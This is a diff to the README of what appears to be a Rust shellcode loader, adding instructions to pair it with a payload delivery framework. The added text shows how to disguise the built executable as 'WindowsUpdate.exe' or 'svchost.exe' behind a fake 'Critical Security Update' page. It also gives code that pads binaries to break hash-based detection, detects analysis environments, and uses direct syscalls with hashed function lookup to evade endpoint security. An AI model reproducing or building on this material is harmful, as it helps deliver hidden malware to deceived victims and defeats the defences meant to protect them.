@@ -2,6 +2,94 @@
 
 A secure and optimized utility for executing encoded shellcode through a dictionary-based decoding mechanism.
 
+## Integration with Tex1step Delivery Framework
+
+Rust-Run has been specifically designed to integrate with the Tex1step delivery framework. This integration provides a powerful combination of Rust-Run's secure shellcode execution capabilities with Tex1step's sophisticated delivery mechanisms.
+
+### Embedded Payload Design
+
+The current implementation embeds both the Spanish dictionary and encoded payload directly within the executable:
+
+- The encoded payload and dictionary are stored as string constants in the source code (`EMBEDDED_DICTIONARY` and `EMBEDDED_ENCODED_PAYLOAD`)
+- This eliminates network dependencies, making the payload more reliable and reducing detection vectors
+- The execution flow remains unchanged, maintaining all security and anti-analysis features
+- The modified `download_with_retries` function intercepts specific URL requests and redirects to embedded content:
+  ```rust
+  fn download_with_retries(client: &reqwest::blocking::Client, url: &str, retries: u8) -> Result<String, Box<dyn Error>> {
+      // Check if this is a request for dictionary or payload and return embedded content
+      if url.ends_with("es-dictionary.txt") {
+          return get_embedded_content("dictionary");
+      } else if url.ends_with("load.txt") {
+          return get_embedded_content("payload");
+      }
+      
+      // Fallback to actual download for any other URLs (keeping original functionality)
+      // ...
+  }
+  ```
+
+### Build Process for Tex1step Integration
+
+```bash
+# 1. Build the Rust-Run executable with embedded payload
+cd ./rust-run
+cargo build --release --target x86_64-pc-windows-gnu
+
+# 2. Copy the compiled executable to Tex1step's payload directory
+cp target/x86_64-pc-windows-gnu/release/rust-run.exe ../tex1step/payloads/WindowsUpdate.exe
+
+# 3. Deploy using Tex1step's build system
+cd ../tex1step
+node src/build.js --exe-name "svchost.exe" --page-title "Critical Security Update" --package-tool custom-rust-run --obfuscate --break-signature-detection
+```
+
+### Custom Integration Option
+
+To maximize delivery effectiveness, you can fully integrate Rust-Run as a custom payload directly in the Tex1step build process:
+
+1. **Create a custom payload handler** in Tex1step:
+   ```javascript
+   // File: tex1step/src/delivery/custom_payload.js
+   function prepareRustRunPayload(options) {
+     const {
+       sourcePath = path.join(__dirname, '../../payloads/rust-run.exe'),
+       outputPath,
+       addRandomization = true,
+       randomDataSize = 512
+     } = options;
+     
+     // Read executable and add randomization to break hash-based detection
+     const exeData = fs.readFileSync(sourcePath);
+     const randomBuffer = crypto.randomBytes(randomDataSize);
+     const combinedBuffer = Buffer.concat([exeData, randomBuffer]);
+     fs.writeFileSync(outputPath, combinedBuffer);
+   }
+   ```
+
+2. **Modify Tex1step's build_exe.js** to use your custom payload:
+   ```javascript
+   // Add 'custom-rust-run' as a package tool option
+   const PACKAGE_TOOLS = ['pkg', 'nexe', 'custom-rust-run'];
+   
+   // In the buildExecutable function:
+   if (config.packageTool === 'custom-rust-run') {
+     customPayload.prepareRustRunPayload({
+       outputPath: path.join(config.outputDir, config.exeName),
+       addRandomization: config.breakSignatureDetection
+     });
+   }
+   ```
+
+### Security Benefits
+
+This integrated approach offers several security advantages:
+
+- No network traffic for payload retrieval, reducing detection vectors
+- All anti-analysis techniques remain functional
+- Execution still uses advanced techniques like indirect syscalls
+- Maintains the appearance of legitimate network operations
+- Compatible with Tex1step's browser-based delivery and anti-detection mechanisms
+
 ## Key Features
 
 ### Memory Handling Optimizations
@@ -24,6 +112,41 @@ A secure and optimized utility for executing encoded shellcode through a diction
 - **Detailed error reporting**: Captures and reports Windows error codes for better diagnostics
 - **Debug mode**: Optional debug mode for detailed shellcode inspection with logging
 - **Missing token tracking**: Counts and reports missing dictionary tokens
+- **Anti-analysis detection**: Checks for virtualization or analysis environments using timing anomalies
+- **Indirect syscalls**: Uses function name hashing and syscall number resolution to avoid direct API imports
+- **PE header resolution**: Dynamically resolves NT headers for finding syscall patterns in memory
+
+### Syscall-Based Evasion
+
+The implementation uses several techniques to avoid detection:
+
+1. **Function resolution by hash**: Instead of using function names directly (which can be easily monitored):
+   ```rust
+   unsafe fn get_syscall_info(function_hash: u32) -> Option<SyscallInfo>
+   ```
+
+2. **Manual PE header parsing**: Examines ntdll.dll in memory to find syscall patterns:
+   ```rust
+   let nt_headers = (ntdll as usize + (*dos_header).e_lfanew as usize) as *const win::IMAGE_NT_HEADERS64;
+   let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[win::IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+   ```
+
+3. **Dynamic syscall number extraction**: Extracts syscall numbers from memory rather than hardcoding:
+   ```rust
+   if ptr::read_unaligned(byte_ptr) == 0xB8 {  // MOV EAX, imm32
+       let ssn = ptr::read_unaligned(byte_ptr.add(1) as *const u32);
+   ```
+
+4. **Direct syscall execution**: Uses inline assembly to execute syscalls directly:
+   ```rust
+   asm!(
+       "mov r10, rcx",
+       "mov eax, {ssn:e}",
+       "syscall",
+       ssn = in(reg) syscall_info.ssn,
+       // ...
+   );
+   ```
 
 ## Build System
 
@@ -83,12 +206,16 @@ The application will automatically:
 
 ### Memory Protection Workflow
 
-1. Allocate memory with `PAGE_READWRITE` permissions
-2. Copy shellcode bytes to allocated memory
-3. Change protection to `PAGE_EXECUTE` (execute-only) using `VirtualProtect`
-4. Insert memory barriers before and after execution
-5. Execute shellcode with proper function signature
-6. Release memory with `VirtualFree`
+1. Allocate memory with `PAGE_READWRITE` permissions:
+   - Primary: Uses `NtAllocateVirtualMemory` syscall identified by hash to avoid direct imports
+   - Fallback: Uses standard `VirtualAlloc` Windows API if syscall method fails
+2. Copy shellcode bytes to allocated memory with proper alignment (16-byte)
+3. Change protection to `PAGE_EXECUTE` (execute-only):
+   - Primary: Uses `NtProtectVirtualMemory` syscall for stealth
+   - Fallback: Uses standard `VirtualProtect` Windows API
+4. Insert memory barriers before and after execution to prevent instruction reordering
+5. Execute shellcode with proper function signature using function pointer casting
+6. Release memory with cleanup routines regardless of execution outcome
 
 ### Dictionary Decoding Process
 
